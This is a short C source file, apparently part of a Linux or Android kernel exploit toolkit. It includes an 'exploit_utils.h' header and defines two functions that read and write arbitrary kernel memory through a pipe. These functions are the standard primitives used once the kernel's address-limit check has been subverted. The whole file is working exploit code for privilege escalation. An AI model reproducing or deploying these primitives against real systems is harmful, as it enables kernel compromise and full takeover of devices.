#include <stdio.h>
#include <string.h>
#include "exploit_utils.h"

ssize_t
read_kernel_memory_by_pipe(unsigned long int address, void *values, size_t length)
{
  int pipefd[2];
  ssize_t ret;

  pipe(pipefd);

  ret = write(pipefd[1], (const void *)address, length);
  if (ret != length) {
    ret = -1;
    goto error_exit;
  }

  ret = read(pipefd[0], values, length);
  if (ret != length) {
    ret = -1;
    goto error_exit;
  }

error_exit:
  close(pipefd[0]);
  close(pipefd[1]);

  return ret;
}

ssize_t
write_kernel_memory_by_pipe(unsigned long int address, const void *values, size_t length)
{
  int pipefd[2];
  ssize_t ret;

  pipe(pipefd);

  ret = write(pipefd[1], values, length);
  if (ret != length) {
    ret = -1;
    goto error_exit;
  }

  ret = read(pipefd[0], (void *)address, length);
  if (ret != length) {
    ret = -1;
    goto error_exit;
  }

error_exit:
  close(pipefd[0]);
  close(pipefd[1]);

  return ret;
}
